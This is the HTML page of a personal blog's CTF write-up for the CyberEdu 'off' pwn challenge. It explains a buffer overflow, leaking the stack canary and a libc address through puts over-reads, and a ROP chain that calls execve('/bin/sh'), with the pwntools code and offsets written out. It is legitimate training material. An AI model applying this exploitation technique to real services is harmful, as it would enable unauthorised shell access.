@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu off Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String">
+<meta name="description" content="Challenge overview
+This application is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.
+
+We also have canary and NX enabled.
+
+Let&rsquo;s look at the functions here. First we have a main which forks every time it&rsquo;s ran:
+
+Then, this function is looped:
+
+It calls some weird functions on the string:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/off-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/off-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/off-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu off Writeup">
+  <meta property="og:description" content="Challenge overview This application is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.
+We also have canary and NX enabled.
+Let’s look at the functions here. First we have a main which forks every time it’s ran:
+Then, this function is looped:
+It calls some weird functions on the string:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-04T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-04T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Buffer-Overflow">
+    <meta property="article:tag" content="Format-String">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu off Writeup">
+<meta name="twitter:description" content="Challenge overview
+This application is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.
+
+We also have canary and NX enabled.
+
+Let&rsquo;s look at the functions here. First we have a main which forks every time it&rsquo;s ran:
+
+Then, this function is looped:
+
+It calls some weird functions on the string:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu off Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/off-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu off Writeup",
+  "name": "CyberEdu off Writeup",
+  "description": "Challenge overview This application is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.\nWe also have canary and NX enabled.\nLet\u0026rsquo;s look at the functions here. First we have a main which forks every time it\u0026rsquo;s ran:\nThen, this function is looped:\nIt calls some weird functions on the string:\n",
+  "keywords": [
+    "CyberEdu", "pwn", "buffer-overflow", "Format-String"
+  ],
+  "articleBody": "Challenge overview This application is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.\nWe also have canary and NX enabled.\nLet’s look at the functions here. First we have a main which forks every time it’s ran:\nThen, this function is looped:\nIt calls some weird functions on the string:\nThis just zeros the first 7 bytes of the string, before it’s read. Interesting.\nThis however, is our buffer overflow. Just keeps reading and writing into a1 aka s1 until a newline!\nIdentifying the vulnerabilities So how can we leak the canary, for the buffer overflow? Since we have a puts(s1) not a printf(s1), we don’t have any format string vulnerabilities, because puts doesn’t interpret things that way.\nBut what it does do, is just keep printing whatever until the next null byte, because that’s how strings work, right? And let’s take a look at the stack layout again:\nchar s1[1032]; // [rsp+0h] [rbp-410h] BYREF unsigned __int64 v2; // [rsp+408h] [rbp-8h]\nSo, if we fill the entire s1 with some garbage, it will keep printing until the x00 ending of the canary. We see that 0x00 at the end, but in actual endian-ness, its at the beginning. So we need to overwrite it, to actually get anything out of it, otherwise it will consider it a null terminator. So this:\np.recvuntil(b')\\n') p.sendline(b\"a\"*1033) p.recvn(1033) data = p.recvn(7) canary = u64(data.rjust(8, b\"\\x00\")) print(hex(canary)) Gives us the canary! To find out libc, we can essentially do the same thing, but cover up everything until libc. The canary doesn’t change between rounds, so that’s really nice! I’m thinking, if we just keep printing values, we’re going to get to libc eventually, right? And we did!\np.recvuntil(b')\\n') #1032 bytes s1, 8 canary, 8 rbp #next 8 bytes, rip #keep adding +8 til libc address p.sendline(b\"a\"*(1032+8+8 +8+8)) p.recvn(1032+8+8+8+8) data3 = p.recvn(6) leaklibc = u64(data3.ljust(8, b\"\\x00\")) The exploit I tried a local system(/bin/sh), everything seemed good but because of the stupid fork() our shell was exiting immediately. So, let’s try that with execve then, since fork is an execve thing itself, and we might be able to replace it.\nI changed it to this\n#gadgeetsuh pop_rdi_ret = 0x04009b3 ret = 0x4005f1 pop_rsi_r15_ret = 0x4009b1 #local libc = leaklibc - 0x29f68 system = libc + 0x53918 execve = libc + 0xde550 binsh = libc + 0x1a7e3c p.recvuntil(b')\\n') payload = (b\"a\"*1032 + p64(canary) + b\"r\"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_r15_ret) + p64(0x0) + p64(0x0) + p64(ret) + p64(execve) ) And we get the local flag!\nNow, let’s connect remotely and see what we can do. The offset from the value to libc will most probably be different. Most likely, 2.23 or 2.27.\nSo it is - looks like a non-ASLR version of libc. But to get the offsets to binsh and execve we need to know the version. Also, we need to guess the offset of the leak.\nLocally, this is how non-ASLR libc gets mapped:\nSo I asked Claude to add a brute force to those 3 bytes. I assumed the version was 2.23, same as ropper, which were sister and brother on the ECSC 2019 Final Phase. It didn’t work, but it should’ve worked. It was Claude’s fault.\nI bruteforced the bytes, for both a 2.27 and a 2.23 version, but to no avail. Then, I thought, 0x7ffff7a2d830 is most likely either libc_start_main or libc_start_main + ret (if we’re lucky. Sometimes it’s nothing, just a completely random offset).\nUsing blukat, it’s exactly those versions that I tested with the bruteforce, which didn’t work! Interesting.\nAnyways, I replaced the offsets:\nlibc = leaklibc - 0x020830 execve = libc + 0xcc770 binsh = libc + 0x18cd57 And we get the flag!\nAs always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "642",
+  "inLanguage": "en",
+  "datePublished": "2026-01-04T00:00:00Z",
+  "dateModified": "2026-01-04T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/off-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu off Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-01-04 00:00:00 +0000 UTC'>January 4, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p><strong><a href="https://app.cyber-edu.co/challenges/55a1cea0-7f21-11ea-ad6a-498299d28f9e?tenant=cyberedu">This application</a></strong> is here just to serve your team. When you are done, you can try to exploit it. We hope is going to be much more fun.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic1.png#center"></p>
+<p>We also have canary and NX enabled.</p>
+<hr>
+<p>Let&rsquo;s look at the functions here. First we have a <code>main</code> which forks every time it&rsquo;s ran:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic2.png#center"></p>
+<p>Then, this function is looped:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic4.png#center"></p>
+<p>It calls some weird functions on the string:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic3.png#center"></p>
+<p>This just zeros the first 7 bytes of the string, before it&rsquo;s read. Interesting.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic5.png#center"></p>
+<p>This however, is our buffer overflow. Just keeps reading and writing into <code>a1</code> aka <code>s1</code> until a newline!</p>
+<hr>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>So how can we leak the canary, for the buffer overflow? Since we have a <code>puts(s1)</code> not a <code>printf(s1)</code>, we don&rsquo;t have any format string vulnerabilities, because <code>puts</code> doesn&rsquo;t interpret things that way.</p>
+<p>But what it <em>does</em> do, is just keep printing whatever until the next null byte, because that&rsquo;s how strings work, right? And let&rsquo;s take a look at the stack layout again:</p>
+<p><code>char s1[1032]; // [rsp+0h] [rbp-410h] BYREF</code>
+<code>unsigned __int64 v2; // [rsp+408h] [rbp-8h]</code></p>
+<p>So, if we fill the entire <code>s1</code> with some garbage, it will keep printing until the <code>x00</code> ending of the canary. We see that <code>0x00</code> at the end, but in actual endian-ness, its at the beginning. So we need to overwrite it, to actually get anything out of it, otherwise it will consider it a null terminator. So this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1033</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">1033</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(data<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(hex(canary))
+</span></span></code></pre></div><p>Gives us the canary! To find out libc, we can essentially do the same thing, but cover up everything until libc. The canary doesn&rsquo;t change between rounds, so that&rsquo;s really nice! I&rsquo;m thinking, if we just keep printing values, we&rsquo;re going to get to <code>libc</code> eventually, right? And we did!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#1032 bytes s1, 8 canary, 8 rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#next 8 bytes, rip</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#keep adding +8 til libc address</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">1032</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data3 <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>leaklibc <span style="color:#f92672">=</span> u64(data3<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span></code></pre></div><hr>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<p>I tried a local <code>system(/bin/sh)</code>, everything <em>seemed</em> good but because of the stupid <code>fork()</code> our shell was exiting immediately. So, let&rsquo;s try that with <code>execve</code> then, since <code>fork</code> is an <code>execve</code> thing itself, and we might be able to replace it.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic7.png#center"></p>
+<p>I changed it to this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#gadgeetsuh</span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04009b3</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005f1</span>
+</span></span><span style="display:flex;"><span>pop_rsi_r15_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4009b1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#local</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> leaklibc <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x29f68</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x53918</span>
+</span></span><span style="display:flex;"><span>execve <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xde550</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1a7e3c</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1032</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(canary) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(pop_rdi_ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(binsh) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(pop_rsi_r15_ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>           p64(execve)
+</span></span><span style="display:flex;"><span>           )
+</span></span></code></pre></div><p>And we get the local flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic8.png#center"></p>
+<p>Now, let&rsquo;s connect remotely and see what we can do. The offset from the value to <code>libc</code> will most probably be different. Most likely, <code>2.23</code> or <code>2.27</code>.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic9.png#center"></p>
+<p>So it is - looks like a non-ASLR version of <code>libc</code>. But to get the offsets to <code>binsh</code> and <code>execve</code> we need to know the version. Also, we need to guess the offset of the leak.</p>
+<p>Locally, this is how non-ASLR libc gets mapped:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/pic10.png#center"></p>
+<p>So I asked Claude to add a brute force to those 3 bytes. I assumed the version was <code>2.23</code>, same as <a href="https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/">ropper</a>, which were sister and brother on the ECSC 2019 Final Phase. It <em>didn&rsquo;t</em> work, but it should&rsquo;ve worked. It was Claude&rsquo;s fault.</p>
+<p>I bruteforced the bytes, for both a 2.27 and a 2.23 version, but to no avail. Then, I thought, <code>0x7ffff7a2d830</code> is most likely either <code>libc_start_main</code> or <code>libc_start_main + ret</code> (if we&rsquo;re lucky. Sometimes it&rsquo;s nothing, just a completely random offset).</p>
+<p>Using blukat, it&rsquo;s exactly those versions that I tested with the bruteforce, which didn&rsquo;t work! Interesting.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/libc.png#center"></p>
+<p>Anyways, I replaced the offsets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> leaklibc <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x020830</span>
+</span></span><span style="display:flex;"><span>execve <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xcc770</span>
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18cd57</span>
+</span></span></code></pre></div><p>And we get the flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/off-writeup/flag.png#center"></p>
+<hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/off.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/format-string/">Format-String</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
